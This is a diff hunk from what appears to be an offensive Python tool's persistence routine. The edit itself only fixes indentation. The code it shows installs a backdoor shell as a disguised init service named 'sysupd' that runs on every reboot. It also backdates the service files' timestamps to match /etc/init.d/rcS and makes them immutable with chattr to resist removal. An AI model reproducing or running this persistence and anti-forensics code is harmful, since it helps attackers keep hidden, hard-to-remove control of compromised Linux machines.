@@ -27,19 +27,19 @@ def persistent():
 			os.system("update-rc.d sysupd defaults")
 			print("[+] Persistent service installed.")
 			print("[+] Modifying accessed and modified times on shell files...")
-            copystat = os.stat('/etc/init.d/rcS')
+            		copystat = os.stat('/etc/init.d/rcS')
 			os.utime("/etc/default/sysupd",(copystat.st_atime, copystat.st_mtime))
 			os.utime("/etc/init.d/sysupd",(copystat.st_atime, copystat.st_mtime))
 			print("[+] Attempting to lock down shell files...")
 			if whereis('chattr') is not None:
 				status = os.system("chattr +i /etc/default/sysupd")
-                if status & 0xff00:
-                    print("[!] Chattr exited with non-zero status. Could not lock files.")
+                		if status & 0xff00:
+					print("[!] Chattr exited with non-zero status. Could not lock files.")
 				status = os.system("chattr +i /etc/init.d/sysupd")
-                if status & 0xff00:
-                    print("[!] Chattr exited with non-zero status. Could not lock files.")
+                		if status & 0xff00:
+                		    print("[!] Chattr exited with non-zero status. Could not lock files.")
 			else:
-                print("[!] Chattr not found. Could not lock files.")
+                		print("[!] Chattr not found. Could not lock files.")
 
 			print("[+] Persistent shell successfull! System will now start your shell as a background process on every reboot.")
 
